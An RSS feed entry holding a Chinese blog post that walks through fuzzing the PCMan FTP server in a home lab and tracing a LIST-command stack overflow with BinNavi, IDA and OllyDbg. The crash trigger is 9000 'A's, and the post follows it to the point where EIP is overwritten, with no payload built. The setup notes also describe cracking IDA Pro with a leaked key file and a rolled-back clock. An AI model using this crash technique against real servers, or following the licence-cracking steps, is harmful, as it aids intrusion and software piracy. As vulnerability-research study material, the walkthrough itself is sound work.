<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>quanyechavshuo</title>
    <description>A blog about programming and network security</description>
    <link>/</link>
    <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Mon, 20 Jun 2016 12:54:25 +0800</pubDate>
    <lastBuildDate>Mon, 20 Jun 2016 12:54:25 +0800</lastBuildDate>
    <generator>Jekyll v3.1.2</generator>
    
      <item>
        <title>pcman-ftp初战漏洞挖掘</title>
        <description>&lt;h3 id=&quot;x01-install-binnavi&quot;&gt;0x01 install binnavi&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://github.com/google/binnavi
http://www.freebuf.com/sectool/75529.html

https://github.com/google/binnavi/releases
http://malwareandmore.blogspot.kr/2015/08/binnavi-install-on-windows.html
https://blog.because-security.com/t/development-environment-for-binnavi-with-a-package-manager-windows/34(better)

直接下载https://github.com/google/binnavi/releases里面的binnavi-all.jar,放到windows下双击,运行不成功说明缺少环境,再从其他几个链接中学习安装
使用教程https://www.zynamics.com/binnavi/manual/html/tutorial.htm
    
最佳安装方案:
将binnavi安装到win2003上
直接双击运行https://github.com/google/binnavi/releases中的binnavi-all.jar,
并将这个链接里面的zynamics_binexport_9.plw和zynamics_binexport_9.p64放入idapro6.8的plugin目录中
将这个链接https://github.com/google/binexport/releases里面的copy_to_ida_root_windows.zip解压后放到ida的根目录下
ida pro6.8的安装如果因为没有注册使得ida pro无法加载binexport9插件(看不到Edit|Plugin|BinExport9说明没有加载成功),则替换ida安装目录下的ida.key文件为这个链接(https://gist.github.com/TheCjw/9f6f7544f33f292db20e)中的ida.key文件,并将系统时间改成若干年前完成ida pro的破解

如果提示有什么问题,再根据
https://blog.because-security.com/t/development-environment-for-binnavi-with-a-package-manager-windows/34
这里面的方法安装缺失依赖,可能不用全部安装完就可以再次尝试直接双击binnavi-all.jar而成功运行

安装postgresql到win2003上会失败,解决方法http://blog.itpub.net/29598413/viewspace-1258961/

以上安装知识理应足够,如需还有这个链接
http://pan.baidu.com/s/1c2Jmtag
里面的readme.md文件有关于安装的问题,另外这个链接里面有大多数需要的依赖环境打包好了

实例安装:(win2003)(事后觉得2中的命令可以不运行,因为binnavi-all.jar为最后编译的结果文件,而2中只是为了编译才做的过程)
0.my_vinnavi从这里下载:http://pan.baidu.com/s/1c2Jmtag
1.安装my_binnavi中的install binnavi on win2003里面的两个exe
2.@powershell -NoProfile -ExecutionPolicy Bypass -Command &quot;iex ((new-object net.webclient).DownloadString(&#39;https://chocolatey.org/install.ps1&#39;))&quot; &amp;amp;&amp;amp; SET PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin
  choco install maven
  choco install ant
  choco install gradle
3.安装jdk8(jdk6不成功),并添加对应C:\Program Files\Java\jdk1.8.0_91\bin和C:\Program Files\Java\jre1.8.0_91\bin到环境变量path,新建一个环境变量JAVA_HOME为C:\Program Files\Java\jdk1.8.0_91\
4.安装idapro6.8,替换key文件,修改本机时间为几年前,将copy_to_ida_root_windows.zip里面的文件放入idapro根目录(重要,没有这步Edit|Plugin中看不到BinExport9),并将binexport的两个文件(zynamics_binexport_9.plw和zynamics_binexport_9.p64)放入idapro的plugin目录
5.安装my_binnavi中的postgresql(x86),数据库用户名和密码设为postgres,将win2003中的c:\program files\postgresql目录设置为everyone有所有权限
6.以管理员身份(否则在binnavi运行后无法import idb文件)运行binnavi-all.jar(win2003下右键以不受限方式打开cmd.exe,然后运行binnavi-all.jar)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-fuzz-target-app&quot;&gt;0x02 fuzz target app&lt;/h3&gt;

&lt;h4 id=&quot;about&quot;&gt;about&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;target link:
    https://www.exploit-db.com/exploits/39662/
target ftp app(pcmanftp):
    https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z
ftp fuzz tool:
    http://www.infigo.hr/files/ftpfuzz.zip

challenge:
    尝试找到pcmanftp除了exploit-db中介绍的已经存在的漏洞以外其他的漏洞
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;fuzz&quot;&gt;fuzz&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;安装ftpfuzz(实验中安装到192.168.3.77中)
2&amp;gt;设置user为annoymous,pass为test
3&amp;gt;只取list命令作为fuzz的对象
4&amp;gt;只选择A作为fuzz的数据
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/fuzzftp.png&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;x03-binnavi&quot;&gt;0x03 binnavi使用方法&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0&amp;gt;binnavi安装在win2003上,ip:192.168.3.176
1&amp;gt;新建一个project
2&amp;gt;导入一个模块(ida生成的idb文件)
    出现错误及安装binnavi解决方法可参考https://github.com/google/binnavi/issues/94
3&amp;gt;新建一个debugger:192.168.3.177:2222
    192.168.3.77为安装ftpfuzz工具的一台win7机器,用于fuzz目标192.168.3.177上的pcmanftp
    192.168.3.176为安装binnavi的机器,用于远程调试192.168.3.177上的ftp进程,并追踪ftp进程上的相关指令
    192.168.3.177为目标ftp运行的机器,通过在192.168.3.177上安装idapro(6.8)加载该ftp进程后产生idb文件,将该idb文件复制到192.168.3.176(win2003)上用binnavi加载
    为了实现在192.168.3.176上远程调试192.168.3.177的ftp,需要在192.168.3.177上运行:
        https://github.com/google/binnavi/releases/download/v6.1.0/debugclient.exe
        或
        http://pan.baidu.com/s/1hsK0jwK中的debugclient.exe
    在win7上不要用管理员权限运行,否则debugclient.exe会报断点错误,运行方法:
        win+r
        cmd
        debugclient.exe pid
4&amp;gt;初始化模块
    双击图中的modules下面的pcmanftpd2.exe,或右键选择laod+initial,使得产生图中有Native Callgraph的面板,此时如果双击图中箭头指向的Native Callgraph可产生graph视图,并可从graph视图(图6)的菜单中选择windows下的debug perspective子项进行进程调试和指令追踪,此处不用这种方法,选择下面更好一点的方法
5&amp;gt;产生grahp视图
    双击NewProject,左键按住modules下的pcmanftpd2.exe并拖到NewProject下的Default address space上面,这样将会把导入的idb模块“对应放到”default address space中,然后可以右键单击defalut address space,选择create combined callgraph,此时将产生上面说的graph视图(图6),如果不用这种方法而用上面的方法则不能在defalut address space上右键选择create combined callgraph,binnavi会报错
6&amp;gt;上面的graph视图窗口对应下面的图6
7&amp;gt;动态调试192.168.3.177上的ftp进程并追踪指令
    在正常binnavi窗口中(非graph窗口):
        在NewProject面板中选择并保存上面设置的debugger,如下图7
        在Default address place面板中选择并保存上面设置的debugger,如下图7-2
    在graph窗口中:
        单击菜单中的windows,并选择debug perspective,将打开调试窗口,如下图7-3
        单击下图7-4中的start debug开始进程调试
        单击下图7-4中的start trace mode开始指令追踪
        实验中binnavi版本为最新的6.1+ida pro6.8,安装在win2003系统上,此安装的binnavi有以下问题:
            1.stop trace mode按钮只是前几次有效(eg.10次内的trace列表)
            2.在1下先按stop trace mode再按start trace mode按钮可以实时刷新地跟踪指令
            3.按下超过一定次数的start trace mode(一定trace列表数)2中情况不再有效,需要重新start debugger,这也意味着要重新在192.168.3.177中重新运行pcmanftp,并运行:
                win+r
                cmd
                debugclient.exe pid
            4.binnavi中使用指令追踪功能时除了上面2中的方法也可以通过删除trace列表里面的已存在的trace,然后重新按start trace mode,这样可以不用按像2中(stop trace mode再按start trace mode)而达到指令追踪的目的,192.168.3.177的win7上运行debugclient.exe pid时不用管理员身份运行虽然会报断点错误,但是好像实际实验中追踪效果更好,此点尚疑.一般情况下,每个应用都用管理员身份运行不易出错(debugclient.exe,pcmanftp,binnavi)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图1
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/binnavi-1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图2
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/binnavi-2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图3
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/binnavi-3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图4
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/binnavi-4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图5
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/binnavi-5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图6
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/binnavi-6.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图7
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/binnavi-7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图7-2
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/binnavi-7-2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图7-3
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/binnavi-7-3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图7-4
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/binnavi-7-4.png&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;x03-&quot;&gt;0x03 实战&lt;/h3&gt;

&lt;h4 id=&quot;dep-off&quot;&gt;1&amp;gt;dep off&lt;/h4&gt;

&lt;p&gt;实验中win7系统中默认dep关闭如下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/dep_close_on_win7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;追踪192.168.3.177中的pcmanftp进程的溢出指令&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.运行192.168.3.177上的pcmanftp后用管理员权限运行clientdebug.exe pid,然后单击192.168.3.176上的graph视图窗口下的debug perspective下的start debug,开始远程调试pcmanftp
2.单击start trace mode,binnavi下完断点后再单击start trace mode,此时binnavi中的trace列表如下图a,然后在192.168.3.77(另外一台win7,安装有ftpfuzz工具,用来fuzz目标192.168.3.177里的pcmanftp),事先设置fuzz数据为发送30,70...到9000个A,后来发现发送9000个A会使pcmanftp出错,于是最后设置fuzz数据为只发送9000个A,便于追踪出错的详细汇编语句,如下图b:
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图a
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/a.png&quot; /&gt;
图b
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/fuzz-2.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;3.完成2中的设置后在192.168.3.77中单击上图中的start按钮,用ftpfuzz发送9000个A,只选择LIST命令进行fuzz,fuzz结束后binnavi中对应trace列表如下图trace1,说明ftpfuzz与binnavi的数据交互中共产生了72个event,也即从发送anonymous登录到发送完LIST 9000xA命令后的event,但是这样不能精确追踪到关键溢出(发送9000个A)时的代码,不会将登录ftp的过程记录到event中,使得event有72个,较大,为了精确追踪到pcmanftp对9000个A的数据处理过程,需要过滤掉fuzzftp登录pcmanftp的过程,于是进行如下操作:
    on 192.168.3.177:
        关闭pcmanftp
        打开pcmanftp    #如果不重新打开pcmanftp,客户端用anonymous登录时会报“too many users”错误
        debugclient.exe pid
    on kali:(192.168.3.106)
        ftp
        open 192.168.3.177
        user:anonymous
        pass:test
    on binnavi(192.168.3.176)
        start trace mode    
            #因为上面重新打开了pcmanftp,此处不用先stop trace mode,binnavi自动关闭了
        start trace mode    
            #这条命令执行后trace列表如下图trace2
    on kali:
        LIST AAA...A(9000个)    
            #结果显示“Invalid command”,再看binnavi中trace列表,发现没有新增,结果依然为下图strace2,认为是terminal终端下登录ftp和ftpfuzz工具有点不同,终端下登录可能被本地ftp客户端的程序发现命令不对先给截断了
    
    on 192.168.3.177:
        重新打开pcmanftp并debug     #重新追踪
    on binnavi:
        重新start debug,start trace mode,start trace mode
    on kali:
        ftp
        open 192.168.3.177
        user:anonymous
        pass:test
    on binnavi:
        start trace mode
            #上面annoymous登录后,运行这条命令前binnavi已记录kali中anonymous登录过程中的指令,在binnavi上运行这条命令后,再从kali中传输list Ax9000的命令则将会记录下list Ax9000这个过程中的指令
    on kali:
        ls AA..A(9000个)
            #后来发现terminal下虽然list命令不可以成功,但可以ls 9000个A发送过去
    on binnavi:
        此时产生list 9000xA命令的trace指令列表,如下图trace3,说明list Ax9000这个命令运行后在pcmanftp上有7个event与之对应,此时eip已经被覆盖成41414141,说明大概到图trace3的sub_427350处已经覆盖了eip为41414141了,后来od跟踪发现确实如此
        也即追踪到的关键event(指令)为:
            sub_402B60
            _atoi
            _atoi
            sub_405410
            sub_427350
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图trace1
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/trace1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图trace2
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/trace2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图trace3
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/trace3.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    追踪到相关指令后此时binavi暂时退出,用od调试pcmanftp

    on 192.168.3.177:
        重新打开pcmanftp,od附加
        f9      #此时单击屏幕底部的状态栏发现不能看到pcmanftp的主界面
        ctrl+g:402b60---&amp;gt;f2
        ctrl+g:405410---&amp;gt;f2     
            #405410处像是异常处理程序相关,下面是od中的数据,后来相通了,这显然是在构造se异常处理,将一个异常处理方法放入栈中,线程初始化时,会自动向栈中安装一个seh,用作线程的默认异常处理
        -----------content of 405410------------
        00405410  /$  6A FF         push -0x1
        00405412  |.  68 292D4300   push PCManFTP.00432D29                   ;  SE 处理程序安装
        00405417  |.  64:A1 0000000&amp;gt;mov eax,dword ptr fs:[0]
        0040541D  |.  50            push eax
        0040541E  |.  64:8925 00000&amp;gt;mov dword ptr fs:[0],esp
        00405425  |.  51            push ecx
        00405426  |.  53            push ebx
        00405427  |.  56            push esi                                 ;  PCManFTP.00441250
        00405428  |.  8BF1          mov esi,ecx
        0040542A  |.  897424 08     mov dword ptr ss:[esp+0x8],esi           ;  PCManFTP.00441250
        0040542E  |.  E8 BD120000   call PCManFTP.004066F0
        ---------------end----------------------
        ctrl+g:427350---&amp;gt;f2
    on kali:
        ftp
        open 192.168.3.177  #发现此时不能显示ftp会话消息,像是pcmanftp&quot;卡住了&quot;
    on 192.168.3.177&#39;s od:
        alt+v
        t
        右键resume all threads  
            #此时可以单击状态栏中的pcmanftp可以显示pcmanftp主界面,且kali中也可以显示ftp会话信息,关于”卡住“以后为什么可以通过resume all threads来调试而”不影响“调试目的有以下猜想:
            windows程序有消息响应机制,windows程序中的主线程一直在等待各个子线程的消息,如果某个子线程中断或者出故障了,可能会被主线程知道,然后主线程调用相应方法去处理这个出问题的子线程,这样就可以解释在下完402b60,405410,427350的断点后,发送ls Ax9000到pcmanftp,在od中一直按f9,却没有在某时刻可以看到eip=41414141,而最后由于的确存在某时刻eip=41414141,导致异常,最后弹出如下图error显示的错误对话框,对话框中显示出错原因为eip被41414141覆盖,这样大概是因为当eip在某时刻被41414141覆盖的时候,于是这个子线程出故障了,程序的主线程知道了这个消息,然后调用seh链中的异常处理程序,处理的结果就是弹出这样一个错误详细信息对话框
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图error
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/error.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;on kali:
    user:anonymous
    pass:test
    ls AAA..A(9000个)
on 192.168.3.177&#39;od:
    此时中断在402b60处
    在堆栈窗口中:ctrl+b查找AAAA
        #提示没有找到
    f9
    此时中断在405410处
    在堆栈窗口中:ctrl+b查找AAAA
        #提示没有找到
    f9
    此时中断在427350处
    在堆栈窗口中:ctrl+b查找AAAA
        #提示找到,说明通过binnavi找到的这些event中,关键的覆盖eip的指令在405410到427350这两个断点之间
    载pcmanftp,并重点关注405410到427350这两个断点之间会经过的指令
    
on 192.168.3.177&#39;s od:(重复以上加载并resume all threads过程直到中断到405410处)
    ...
    ...
    ...
    --------查找关键汇编指令方法---------
    结过漫长的ctrl+f9,f8,时刻关注堆栈,寄存器,反汇编窗口指令等,在可疑函数f8单步步过后在堆栈窗口中ctrl+b查找AAAA
    --------------end--------------------

现从405410到427350两个断点之间的指令,如果通过f8,f7,ctrl+f9等的一步一步调试无法到达覆盖eip的关键指令处,而通过在405410断点处直接f9到427350处会经过覆盖eip的关键指令处,然而确无法单步调试到关键指令处。

单步调试时指令经过流程为:
    405410到427350,再由427350到427350
    其中405410到427350流程中无法捕捉到覆盖eip的关键指令,于是指令开始在427350到427350之间一直循环,像是一个进程阻塞当中(eg.listen,accept),427350到427350也无法捕捉到覆盖eip的关键指令,在427350处f9到427350时,情况和下面的405410处f9到427350的情况一样

但是,两个断点之间f9运行调试时:
    在405410处f9到427350时,在堆栈窗口中ctrl+b:41414141却能找到41414141,说明f9运行时,的确经过了覆盖eip的关键指令

出现以上这种现象暂时不能理解,猜测有可能是427350是一个循环等待的函数,并且与有时间相关,如果每次时间超过一定时间(单步调试程序某个线程等待造成时间较长),这个427350处的循环等待判断为无效,即只在一定时间内判定为有效循环等待(这样在427350处f9运行调试到427350处时可以在堆栈窗口捕获到AAAA就可以理解了)

于是尝试在405410和427350下断点后（到此处不用在402b60处下断点了）,f9运行pcmanftp,然后在kali中的terminal中ftp open 192.168.3.177登录，之后输入ls 9000xA命令，待od中中断到405410时，在od的汇编代码区右键查看所有模块间调用，并在所有模块间调用处下断点，然后一直f9运行调试pcmanftp，这样有可能会在堆栈区捕获到AAAA,具体步骤如下:

on 192.168.3.177&#39;s od:
    alt+f2      #关闭调试程序
    重新运行pcmanftp并附加到od
    ctrl+g:405410---&amp;gt;f2
    ctrl+g:427350---&amp;gt;f2
    f9
on kali:
    ftp
    open 192.168.3.177
on 192.168.3.177&#39;s od:
    f9      #不是必须
    alt+v
    t
    右键resume all threads
on kali:
    user:anonymous
    pass:test
    ls AAA..A(9000个)
on 192.168.3.177&#39;s od:
    自动中断在405410处
    右键查找所有模块间调用
    在每个命令上设置断点
    alt+c
    f9
    ...
    (alt+c后共输入123个f9)
    此时观察到堆栈区第一次出现大长串AAAAAAAAAA,断点处在416685,也即在416685处的模块间调用开始出现AAAAAAA,如下图od1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图od1
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/od1.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;于是重新在405410，416685，427350处下断点，重点关注405410到416685后,在416685开始的指令流程,具体如下：

on 192.168.3.177&#39;od:
    ctrl+g:405410---&amp;gt;f2
    ctrl+g:427350---&amp;gt;f2
    f9
on kali:
    ftp
    open 192.168.3.177
on 192.168.3.177&#39;od:
    alt+v
    t
    resume all threads
on kali:
    user:anonymous
    pass:test
    ls AA..A(9000个)
on 192.168.3.177&#39;s od:
    ctrl+g:416685---&amp;gt;f2
    alt+c
    此时自动中断在405410处

    ------------output:-----------
    00405410  /$  6A FF         push -0x1
    00405412  |.  68 292D4300   push PCManFTP.00432D29                   ;  SE 处理程序安装
    00405417  |.  64:A1 0000000&amp;gt;mov eax,dword ptr fs:[0]
    0040541D  |.  50            push eax
    --------------end-------------

    f9
    此时自动中断在416685处

    -----------output：-----------
    00416685  |.  FF15 58524300 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.GetLastErr&amp;gt;; [GetLastError
    0041668B  |.  FF35 B0284400 push dword ptr ds:[0x4428B0]             ; /TlsIndex = 1A
    00416691  |.  8BF8          mov edi,eax                              ; |
    00416693  |.  FF15 98514300 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.TlsGetValu&amp;gt;; \TlsGetValue
    ------------end---------------

    f9
    此时又中断到416685处(不过堆栈窗口出现了AAAAAAA)

    ------------output：-----------
    00416685  |.  FF15 58524300 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.GetLastErr&amp;gt;; [GetLastError
    0041668B  |.  FF35 B0284400 push dword ptr ds:[0x4428B0]             ; /TlsIndex = 1A
    00416691  |.  8BF8          mov edi,eax                              ; |
    00416693  |.  FF15 98514300 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.TlsGetValu&amp;gt;; \TlsGetValue
    --------------end--------------
    
    此时对应的od中截图如下图od2:
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img srg=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/od2.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;esp下面的第一个返回到的地址为当前栈帧的返回地址，也即汇编窗口中004166e9处的retn要返回到的地址
esp下面的第二个返回到的地址4029db为当前函数栈帧的上一函数栈帧中的retn要返回的地址
esp下面的第三个返回到的地址4029ff为当前函数栈帧的上一函数的上一函数的栈帧中的retn要返回的地址

此时堆栈窗口数据如下：
    ----------------stack------------------
    0018ED28   00000402
    0018ED2C   004411DC  ASCII &quot;
    &quot;
    0018ED30   00412967  返回到 PCManFTP.00412967 来自 PCManFTP.00416683
    0018ED34   00000402
    0018ED38   00000000
    0018ED3C   00000000
    0018ED40   0018ED68
    0018ED44   0018ED64
    0018ED48   00000000
    0018ED4C   00000000
    0018ED50   00001000
    0018ED54   0018ED78  ASCII &quot;LIST AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;...
    0018ED58   01D817A0
    0018ED5C   004029DB  返回到 PCManFTP.004029DB 来自 wsock32.recv
    0018ED60   01D817A0
    0018ED64   004029EF  返回到 PCManFTP.004029EF 来自 PCManFTP.00412956
    0018ED68   0018ED78  ASCII &quot;LIST AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;...
    0018ED6C   004411DC  ASCII &quot;
    &quot;
    0018ED70   00000000
    0018ED74   00000001
    0018ED78   5453494C
    0018ED7C   41414120
    0018ED80   41414141
    0018ED84   41414141
    0018ED88   41414141
    0018ED8C   41414141
    -----------------end-------------------

参照上一篇文章：
http://xinghuacai.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%85%A5%E9%97%A8-%E5%8A%A8%E6%80%81%E8%B7%9F%E8%B8%AA%E6%BA%90%E4%BB%A3%E7%A0%81%E5%92%8C%E5%8F%8D%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81/中的图stack0易知：
    
    其中栈中0018ed8c以后很长一段数据都是41414141，由于此时中断到416685而堆栈窗口中首次出现AAAAAA数据，而堆栈窗口中最近的三个返回地址中00412976对应的是本函数栈帧(对应图od2)中的004166e9处的retn，这样的话，很有可能是本函数栈帧的上一帧函数（该函数内的retn对应返回到4029db）或者是上上一帧函数（该函数内的retn对应返回到4029ef）的返回地址被此时栈中的大长串A覆盖成41414141
    当前eip对应的函数帧是00416683函数，当前函数帧的上一帧函数是wsock32.recv，wsock32.recv函数帧的上一函数帧的00412956函数，形如下面表示：
    -----------------------------format:--------------------------------
    00412956:(412956函数帧)
            00412954:push ebp
            xxxxxxxx:mov ebp，esp
            xxxxxxxx:...
            xxxxxxxx:...
            xxxxxxxx:call wsock32.recv(这条汇编语句的下一条语句的地址为004029db)
                       (wsock32.recv函数帧)
                       recv&#39;s addr:push ebp
                       xxxxxxxx:mov ebp,esp
                       xxxxxxxx:...
                       xxxxxxxx:...
                       xxxxxxxx:call 00416683(这条汇编语句的下一条语句的地址为00412967)
                                  (00416683函数帧,对应图od2中语句)
                                  00416683:push ebp
                                  xxxxxxxx:mov ebp,esp
                                  xxxxxxxx:...
                                  xxxxxxxx:...
                                  00416685:call getlasterror
                                  0041668b:push ds:[0x4428b0]
                                  xxxxxxxx:...
                                  xxxxxxxx:...
                                  004166e9:retn(将返回到00412967)
                                  ...
                                  ...
                       00412967:...(此处00412967对应为上面call 00416683语句中00416683函数的返回地址)
                       ...
                       ...
                       xxxxxxxx:retn(将返回到004029db)
                       ...
                       ...
            004029db:...(此处004029db对应为上面call wsock32.recv语句中wsock32.recv函数的返回地址)
            ...
            ...
            xxxxxxxx:retn(将返回到004029ef)
            ...
            ...
    004029ef:xxx(此处004029ef对应00412956函数桢中的retn语句要返回的地址)
    -------------------------------end----------------------------------
        
    所以有可能当前函数帧（对应图od2）中的汇编语句（执行到4166e9处的retn之前的语句）会导致栈中的两个返回地址(0018ed5c处的004029db和0018ed64处的004029ef)被覆盖,也有可能在wsock32.recv函数帧中某语句覆盖0018ed64处的004029ef，也有可能是本函数帧（00416683，正常情况下esp下面最近一个返回地址在od中显示来自于什么函数则当前eip在该函数帧中）的下一函数帧（也即还没执行到的函数，当前函数帧为最新函数帧）中的汇编语句覆盖两个返回地址或这两个返回地址下面比较远的返回地址等

    于是重点关注堆栈窗口中的0018ed5c处的004029db和0018ed64处的004029ef是否可能会在当前函数帧中执行到004166e9之前或下一个将到达的函数帧中被改写成41414141

    在od中f8单步调试时，遇到可疑指令如call xxx等，在堆栈窗口中ctrl+g(堆栈中跟随):0018ed5c或0018ed64，然后f8单步调试,具体如下操作：

    ------------从图od2中情况下开始的操作-------------
    f8
    f8
    ..
    f8
    执行到图od2中的004166e9处的retn时，0018ed5c和0018ed64处的返回地址都不变，继续f8跳到412967处，此时在wsock32.recv函数帧中，继续f8
    f8
    ..
    f8
    执行到412997处时，在到达这个函数帧中的rent语句前，所有的指令都在wsock32.recv函数帧中，0018ed5c中的返回地址由004029db被改成000000，也即wsock32.recv函数帧中的retn指令被执行时将返回到由004029db变成的00000000,此时栈帧已经被破坏，执行完wsock32.recv函数帧中的retn指令后，将跳到00000000执行，也即在当前帧（wsock32.recv函数帧)中执行到retn语句时，将发生错误，对应汇编指令为：

        00412976    5F              pop edi
        00412977    8A16            mov dl,byte ptr ds:[esi]
        00412979    B3 01           mov bl,0x1
        0041297B    0FB6CA          movzx ecx,dl

    对应堆栈窗口中0018ed5c和0018ed64处的内容为：

        0018ED58   00000000
        0018ED5C   00000000
        0018ED60   01D817A0
        0018ED64   004029EF  返回到 PCManFTP.004029EF 来自 PCManFTP.00412956
        0018ED68   0018ED78  ASCII &quot;LIST AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;...
        0018ED6C   01D80F80

    而当前函数帧中的retn语句在如下位置004129f9处：

        004129F1    F7D8            neg eax
        004129F3    1BC0            sbb eax,eax
        004129F5    23C3            and eax,ebx
        004129F7    5B              pop ebx
        004129F8    C9              leave
        004129F9    C3              retn

    所以如果是要将堆栈窗口中0018ed5c处的004029db或0018ed64处的004029ef这两个返回地址覆盖成41414141有极大的可能是在当前函数帧的004129f9处的retn语句前完成，而0018ed64处被覆盖成41414141的可能性更大，因为0018ed5c处已经被覆盖成00000000了

    f8
    f8
    ..
    f8
    在eip=004129f9前，单步执行到004129c1处
    f8
    f8
    ..
    f8执行到004129df，以jmp 到004129c1，也即004129c1到004129df相当于一个for循环,004129c1处开始到retn语句前的汇编指令如下：

        004129C1    8A02            mov al,byte ptr ds:[edx]
        004129C3    84C0            test al,al
        004129C5    74 1E           je short PCManFTP.004129E5
        004129C7    0FB6F0          movzx esi,al
        004129CA    8BCE            mov ecx,esi
        004129CC    6A 01           push 0x1
